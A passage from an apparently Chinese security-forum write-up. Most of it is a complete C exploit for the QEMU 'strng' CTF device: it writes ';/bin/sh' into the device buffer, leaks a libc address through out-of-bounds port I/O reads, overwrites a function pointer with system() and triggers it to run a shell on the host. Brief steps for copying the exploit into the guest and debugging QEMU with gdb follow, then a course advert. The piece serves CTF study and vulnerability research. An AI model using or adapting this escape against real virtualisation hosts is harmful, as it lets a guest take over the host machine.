
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/io.h>
#include <assert.h>

#define LOG(...) printf(__VA_ARGS__)

void die(const char *msg) {
    perror(msg);
    _exit(-1);
}

void hexdump(uint8_t *mem, size_t len) {
    for (size_t i = 1; i <= len; i++) {
        printf("%02x ", mem[i-1]);
        if (i % 16 == 0)
            printf("\n");
        else if (i % 8 == 0)
            printf("  ");
    }
}

#define STRNG_MMIO_BASE 0xfebf1000
#define STRNG_MMIO_SIZE 0x100

#define STRNG_PMIO_BASE 0x000000000000c050
#define STRNG_PMIO_SIZE 0x8

uint64_t strng_mmio_map = 0x0;

uint32_t readm32(uint64_t addr) {
    return *(uint32_t *)addr;
}

void writem32(uint64_t addr, uint32_t val) {
    *(uint32_t *)addr = val;
}

uint32_t strng_mmio_read(uint64_t addr) {
    assert(!(addr&3));
    uint32_t val = readm32(strng_mmio_map+addr);
    return val;
}

void strng_mmio_write(uint64_t addr, uint32_t val) {
    assert(!(addr&3));
    writem32(strng_mmio_map+addr, val);
}

uint32_t strng_pmio_read(uint64_t addr) {
    assert(addr ==4 || addr ==0);
    return inl(STRNG_PMIO_BASE+addr);
}

void strng_pmio_write(uint64_t addr, uint32_t val) {
    assert(addr ==4 || addr ==0);
    outl(val, STRNG_PMIO_BASE+addr);
}

int main(int argc, char const *argv[]) {
    int devmem_fd;

    if (0 != iopl(3)) {
        die("iopl");
    }

    devmem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (devmem_fd < 0) {
        die("open /dev/mem");
    }

    strng_mmio_map = (uint64_t)mmap((void *)0, STRNG_MMIO_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, devmem_fd, STRNG_MMIO_BASE);
    if (!strng_mmio_map) {
        die("mmap mmio");
    }
    close(devmem_fd);

#if 0
    strng_mmio_write(0x40, 0xdeadbeef);
    uint32_t val = strng_mmio_read(0x40);
    printf("0x%016x", val);
#endif

    // /bin/sh
    strng_pmio_write(0, 0x8);
    strng_pmio_write(4, 0x41414141);
    // junk
    strng_pmio_write(0, 0xc);
    strng_pmio_write(4, 0x41414141);
    // junk
    strng_pmio_write(0, 0x10);
    strng_pmio_write(4, 0x69622f3b);
    // ';/bin/sh'
    strng_pmio_write(0, 0x14);
    strng_pmio_write(4, 0x68732f6e);
    // ';/bin/sh'

    // leak
    strng_pmio_write(0, 0x108);
    uint64_t libc_srand = strng_pmio_read(4);
    libc_srand = (libc_srand << 32);
    strng_pmio_write(0, 0x104);
    libc_srand += strng_pmio_read(4);
    printf("libc_srand 0x%016llx\n", libc_srand);

    uint64_t libc_base = libc_srand - 0x00043cd0;//0x3a820;
    uint64_t libc_system = libc_base + 0x0004f550;//0x449c0;

    // rewrite with system
    strng_pmio_write(0, 0x114);
    strng_pmio_write(4, libc_system&0xffffffff);
    strng_pmio_write(0, 0x118);
    strng_pmio_write(4, libc_system>>32);
    getchar();
    // invoke system
    strng_pmio_write(0, 0xc);
    strng_pmio_write(4, 0);

    return 0;
}
```
然后host使用命令 `scp -P5555 exp ubuntu@127.0.0.1:/home/ubuntu` 将`exp`拷贝到虚拟机中。

若要调试`qemu`以查看相应的流程，host机器可以使用 `ps -ax|grep qemu` 找到相应的进程；再 ``sudo gdb ./qemu-system-x86_64 -p `pidof qemu-system-x86_64` `` 上去，然后在里面下断点查看想观察的数据，示例如下：

发现经常会因为stop signal断下，所以加上 `handle SIGSTOP nostop`

断点如下：

`b strng_pmio_write`
`b strng_pmio_read`
`b strng_mmio_write`
`b strng_pmio_read`

然后在虚拟机中执行 `sudo ./exp` 执行`exp`，就可以愉快的调试了。

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2021-7-2 15:57

被nicaicaiwo编辑

，原因：
